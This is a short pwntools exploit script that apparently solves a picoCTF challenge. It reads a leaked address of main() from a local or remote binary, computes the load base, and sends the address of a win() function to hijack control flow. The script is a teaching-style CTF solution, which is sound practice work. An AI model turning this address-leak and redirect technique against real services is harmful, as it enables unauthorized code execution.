from pwn import *

elf = context.binary = ELF('./vuln')


LOCAL = True


if LOCAL:
    p = process(elf.path)    
else:
    p = remote('rescued-float.picoctf.net', 54794)

line = p.recvline_contains(b'Address of main:')
leaked_main = int(line.strip().split()[-1], 16)

print("[*] Leaked address of main():", hex(leaked_main))

elf.address = leaked_main - elf.symbols['main']
log.success(f"ELF base: {hex(elf.address)}")

# elf.symbols['win'] already includes the base
win_addr = elf.symbols['win']
log.success(f"Sending address of win(): {hex(win_addr)}")

p.sendline(hex(win_addr))

output = p.recvall(timeout=2).decode()
print("[*] Program output:\n", output)
